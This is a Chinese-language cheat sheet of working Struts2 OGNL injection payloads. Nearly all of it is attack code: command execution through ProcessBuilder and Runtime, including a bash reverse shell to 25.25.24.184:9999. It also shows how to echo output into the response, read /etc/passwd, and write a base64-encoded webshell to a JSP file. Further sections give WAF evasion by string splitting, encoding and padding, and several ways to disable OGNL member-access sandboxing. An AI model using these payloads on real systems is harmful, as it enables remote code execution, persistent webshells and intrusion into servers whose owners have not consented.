## POC解析

### POC构造

#### (1) 命令执行
ProcessBuilder基本用法
```
String[] cmd = new String[]{"open","-a","/System/Applications/Calculator.app"};
ProcessBuilder processBuilder = new ProcessBuilder(cmd);
processBuilder.redirectErrorStream(true);
try {
    Process process = processBuilder.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    }
}
```
对应的OGNL表达式
```
#a=new ProcessBuilder(new java.lang.String[]{"cmd"}).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#br=new java.io.BufferedReader(#c),
#e=new char[50000],
#br.read(#e)
```
Runtime对应的OGNL表达式
```
#myret=@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')
//unicode替换 # =
\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')
```
根据操作系统执行命令
```
#cmd='bash -i >& /dev/tcp/25.25.24.184/9999 0>&1' //要执行的命令
#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')
//如果包含win，即调用windows的cmd.exe；否则认为是linux，调用/bin/bash
#cmds=#iswin?new java.lang.String[]{'cmd.exe','/c',#cmd}:new java.lang.String[]{'/bin/bash','-c',#cmd}

//第一种写法
#s=new java.util.Scanner((new java.lang.ProcessBuilder(#cmds)).start().getInputStream()).useDelimiter('\\AAAA')
#str=#s.hasNext()?#s.next():''
#resp=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")
#resp.setCharacterEncoding('UTF-8')
#resp.getWriter().println(#str)
#resp.getWriter().flush()
#resp.getWriter().close()
  
//第二种写法
#p=new java.lang.ProcessBuilder(#cmds)
#p.redirectErrorStream(true)
#process=#p.start()
#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())
@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)
#ros.flush()
```

#### (2) 输出回显
HttpServletResponse获取输出流有两种方式，getOutStream和getWriter，基本用法如下
```
//HttpServletResponse对象获取
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")

//输出流获取
ServletOutputStream outputStream = response.getOutputStream();
outputStream.print("Hello");

PrintWriter writer = response.getWriter();
writer.write("hello");

//or
writer.println("hello")
writer.flush();
writer.close();
```
对应的OGNL语法
```
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")
#f.getWriter().write(#e),
#f.getWriter().flush(),
#f.getWriter().close()
```
如果开发场景下自带回显
```
#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
```

#### (3) 获取Web目录
getRealPath获取路径的基本用法
```
request.getRealPath("/"); //获取根路径
request.getRealPath(request.getRequestURI()); //获取jsp路径
request.getSession().getServletContext().getRealPath("/"); //获取根路径
.getClass().getClassLoader().getResource("").getPath(); //获取工程classes下的路径
request.getServletContext().getRealPath(File.separator); 
"/" 可以写成 File.separator
```
对应的OGNL语法
```
//request获取方法
#req=@org.apache.struts2.ServletActionContext@getRequest()
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')

//response回显方法1
#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()
#response.println(#req.getRealPath('/')),#response.flush(),#response.close()

//response回显方法2
#response=@org.apache.struts2.ServletActionContext@getResponse()
#response.getWriter().println(#req.getRealPath('/'))
#response.getWriter().close()
```

#### (4) print探测漏洞
```
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')
#resp.setCharacterEncoding('UTF8')
#resp.getWriter().print("here_is_")
#resp.getWriter().print("test")
#resp.getWriter().flush()
#resp.getWriter().close()
```

#### (5) 获取系统信息
```
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')
#resp.setCharacterEncoding('UTF-8')
#resp.getWriter().print("os.version")
#resp.getWriter().print(@java.lang.System@getProperty("os.version"))
#resp.getWriter().flush()
#resp.getWriter().close()
```

#### (6) 文件上传/写文件

利用FileWriter，传入base64加密后的木马

```java
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')
#shell="" //base64加密后的木马
#cmd=new java.lang.String(new sun.misc.BASE64Decoder().decodeBuffer(#shell))
#res.getWriter().print(#cmd)
#bw=new java.io.BufferedWriter(new java.io.FileWriter(#req.getRealPath("/testb.jsp")))
#bw.write(#cmd)
#bw.close()
```

直接写文件

```java
{#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')
#res.getWriter().print("file context")
#res.getWriter().print("ok")
#res.getWriter().print(#req.getContextPath())
#res.getWriter().flush()
#res.getWriter().close()
new java.io.BufferedWriter(new java.io.FileWriter(#req.getRealPath("/qqq.jsp"))).append(#req.getParameter("shell")).close()}&shell=123
```

#### (7) 无需new
```
#UnicodeSec=#application['org.apache.tomcat.InstanceManager']
#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')
#cmd={'cat //etc//passwd'}
#res=#exec.exec(#cmd)
```

#### (8) 括号解析机制
```
//无点号(.)连接的表达式，先计算one，再以two为根对象计算一次
(one)(two) 

//常见写法
(expression)(constant)=value  -> 执行expression=value
(constant)((expression1)(expression2))  ->执行expression2，再执行expression1


top['foo'](0) -> (top['foo'])(0)
z[(foo)('meh')] -> z 和 [()()]
```

### 绕WAF
```
// 1. 敏感词字符拆分
//原
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
//拆
#req=#context.get('co'+'m.open'+'symphony.xwor'+'k2.disp'+'atcher.HttpSer'+'vletReq'+'uest')


// 2. url编码
`#`、`=`、`:`、`+`、`空格`等

// 3. base64混淆
#cmd=new java.lang.String(new sun.misc.BASE64Decoder().decodeBuffer(#req.getHeader('zz')))
#cmd=new java.lang.String(new sun.misc.BASE64Decoder().decodeBuffer(#req.getHeader('zz').replace('DASHUAIGE','')))

// 4. unicode编码
例如，`#`编码为`\u0023`等，其余字符也可进行unicode编码

// 5. 字符填充，如空格、`\0a` `\t`、垃圾字符
在`#`和非根对象中插入空格等
在`.`后面加入`\0a`或`\t`
```

### 绕Access限制
#### (1) denyMethodExecution

```java
#context[\'xwork.MethodAccessor.denyMethodExecution\']=false
#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET
```

#### (2) allowStaticMethodAccess

```java
//简版
#_memberAccess["allowStaticMethodAccess"]=true

//第一种
#_memberAccess["allowStaticMethodAccess"]=true
#foo=new java.lang.Boolean("false")
#context["xwork.MethodAccessor.denyMethodExecution"]=#foo
  
//第二种
#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")
#f.setAccessible(true)
#f.set(#_memberAccess,true)
#context["xwork.MethodAccessor.denyMethodExecution"]=false
  
//第三种
#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false)
#_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true)
```

#### (3) @DEFAULT_MEMBER_ACCESS

```java
#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
```

#### (4) 多重黑名单

```java
#_memberAccess['allowPrivateAccess']=true
#_memberAccess['allowProtectedAccess']=true
#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']
#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties']
#_memberAccess['allowPackageProtectedAccess']=true
#_memberAccess['allowStaticMethodAccess']=true
```

#### (5) container

```java
//第一种
#container=#context['com.opensymphony.xwork2.ActionContext.container']
#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)
#ognlUtil.getExcludedPackageNames().clear()
#ognlUtil.getExcludedClasses().clear()
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
#context.setMemberAccess(#dm)
  
//第二种
#ct=#request['struts.valueStack'].context
#cr=#ct['com.opensymphony.xwork2.ActionContext.container']
#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)
#ou.setExcludedClasses('')
#ou.setExcludedPackageNames('')
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
#ct.setMemberAccess(#dm)
```

#### (6) BeanMap

```java
#UnicodeSec=#application['org.apache.tomcat.InstanceManager']
#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')
#stackvalue=#attr['struts.valueStack']
#potats0.setBean(#stackvalue)
#context=#potats0.get('context')
#potats0.setBean(#context)
#sm=#potats0.get('memberAccess')
#emptySet=#UnicodeSec.newInstance('java.util.HashSet')
#potats0.setBean(#sm)
#potats0.put('excludedClasses',#emptySet)
#potats0.put('excludedPackageNames',#emptySet)
```
